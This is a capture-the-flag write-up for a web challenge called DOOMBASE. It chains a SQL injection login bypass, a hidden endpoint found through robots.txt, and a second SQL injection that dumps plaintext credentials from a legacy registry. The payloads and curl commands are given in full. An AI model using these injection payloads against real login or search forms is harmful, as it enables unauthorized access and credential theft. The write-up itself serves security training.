# DOOMBASE

**Category:** Web  
**Difficulty:** Medium  
**Points:** 300  
**Flag Format:** `DOOM{}`

## Challenge Overview

The challenge presented a S.H.I.E.L.D.-themed authentication portal protecting **DOOM's Private Vault**.

The objective was to gain administrator access and recover the hidden flag.

During the solve, the lab was hosted at:

```text
http://34.47.170.218:33714
```

> The IP/port belongs to the temporary Docker lab and may change between instances.

---

## Reconnaissance

I started by inspecting the main application and a few common endpoints:

```bash
BASE="http://34.47.170.218:33714"

curl -i "$BASE/"
curl -s "$BASE/robots.txt"
curl -s "$BASE/sitemap.xml"
```

The application was running:

```text
Werkzeug/3.1.8
Python/3.12.14
```

The homepage contained a login form with the following parameters:

```text
username
password
```

The most interesting discovery came from `robots.txt`:

```text
User-agent: *
Disallow: /legacy-registry
```

This revealed a hidden endpoint:

```text
/legacy-registry
```

Directory enumeration also identified:

```text
/admin
/logout
/denied
```

The `/admin` endpoint returned a redirect to `/`, indicating that authentication was required.

---

## Initial Authentication Bypass

I tested the login form for SQL injection.

Normal credentials such as:

```text
admin / x
doom / x
```

failed.

However, the following username payload successfully bypassed authentication:

```text
admin'-- -
```

Equivalent payloads such as:

```text
' OR 1=1-- -
' OR '1'='1'-- -
```

also worked.

Example request:

```bash
curl -is \
  -c /tmp/doom.jar \
  -X POST "$BASE/" \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x"
```

The response redirected to:

```text
/admin
```

and issued a Flask session cookie containing an administrator session.

Conceptually, the vulnerable backend query was likely similar to:

```sql
SELECT *
FROM users
WHERE username = '<username>'
AND password = '<password>';
```

Using:

```sql
admin'-- -
```

comments out the password comparison.

---

## Secondary Authentication

After accessing `/admin`, another security layer appeared:

```text
OMEGA CLEARANCE // SECONDARY VERIFICATION
DOOM'S PRIVATE VAULT
```

The page stated that first-stage authentication had succeeded, but the application required the **original administrator credentials** before releasing the Omega intelligence.

The form used:

```text
admin_username
admin_password
```

Trying SQL injection against this second login did not work.

For example:

```text
admin'-- -
' OR 1=1-- -
' OR '1'='1'-- -
```

all resulted in:

```text
OMEGA VERIFICATION FAILED
```

This indicated that the intended solution was to recover the legitimate credentials rather than bypass the second authentication layer.

---

## Accessing the Legacy Registry

Because `/legacy-registry` originally redirected unauthenticated users back to `/`, I accessed it again while using the administrator session cookie obtained through the first SQL injection.

```bash
curl -s \
  -b /tmp/doom.jar \
  "$BASE/legacy-registry"
```

This revealed the:

```text
LEGACY AGENT REGISTRY
```

with a search form using the parameter:

```text
agent
```

The application described it as an archived S.H.I.E.L.D. agent database.

---

## Registry SQL Injection

Searching directly for:

```text
admin
```

returned an archived administrator record.

The registry was also vulnerable to SQL injection.

Payload:

```text
' OR 1=1-- -
```

Example:

```bash
curl -s \
  -b /tmp/doom.jar \
  -X POST "$BASE/legacy-registry" \
  --data-urlencode "agent=' OR 1=1-- -"
```

This caused the application to return all records from the legacy database.

The records included:

```text
Username: admin
Password: VictorDoom_1962!
Role: admin
```

Other archived accounts included:

```text
Username: doctor
Password: Latveria_07
Role: agent
```

and:

```text
Username: archive
Password: S.H.I.E.L.D._Archive
Role: service
```

The important credentials were therefore:

```text
Username: admin
Password: VictorDoom_1962!
```

---

## Omega Vault Authentication

With the real administrator credentials recovered, I submitted them to the secondary authentication form:

```bash
curl -s \
  -b /tmp/doom.jar \
  -X POST "$BASE/admin" \
  --data-urlencode "admin_username=admin" \
  --data-urlencode "admin_password=VictorDoom_1962!" \
  -o /tmp/omega.html
```

The flag could then be extracted with:

```bash
grep -oE 'DOOM\{[^}]+\}' /tmp/omega.html
```

Output:

```text
DOOM{Exploiter_L0v3s_w3b}
```

---

## Flag

```text
DOOM{Exploiter_L0v3s_w3b}
```

---

## Exploitation Chain

```text
Initial reconnaissance
        ↓
robots.txt
        ↓
Discover /legacy-registry
        ↓
SQL injection in main login
        ↓
Obtain administrator Flask session
        ↓
Access /admin
        ↓
Discover secondary Omega verification
        ↓
Access authenticated /legacy-registry
        ↓
SQL injection in agent search
        ↓
Dump archived credentials
        ↓
Recover admin : VictorDoom_1962!
        ↓
Authenticate to Omega Vault
        ↓
Retrieve flag
```

---

## Vulnerabilities Identified

### 1. SQL Injection — Primary Login

The main authentication mechanism directly accepted malicious SQL input through the `username` parameter.

Example:

```text
admin'-- -
```

This allowed authentication to be bypassed completely.

### 2. Improper Access Control / Hidden Endpoint Exposure

The application disclosed:

```text
/legacy-registry
```

through `robots.txt`.

Although the endpoint required authentication, once the primary login was bypassed it became accessible.

### 3. SQL Injection — Legacy Registry

The `agent` search parameter was vulnerable to SQL injection.

Example:

```text
' OR 1=1-- -
```

This resulted in multiple database records being returned.

### 4. Plaintext Credential Storage

The legacy registry stored administrator passwords directly in plaintext:

```text
VictorDoom_1962!
```

This made credential recovery immediately useful against the secondary authentication mechanism.

---

## Key Takeaways

The challenge demonstrated how multiple relatively simple weaknesses can be chained together:

```text
SQL Injection
+
Weak access control
+
Sensitive legacy database
+
Plaintext credentials
=
Full administrator compromise
```

The first SQL injection did not directly reveal the flag. Instead, it provided the authorization required to reach a hidden legacy application.

That legacy application contained another SQL injection vulnerability, allowing the legitimate administrator credentials to be recovered and used against the stronger secondary verification layer.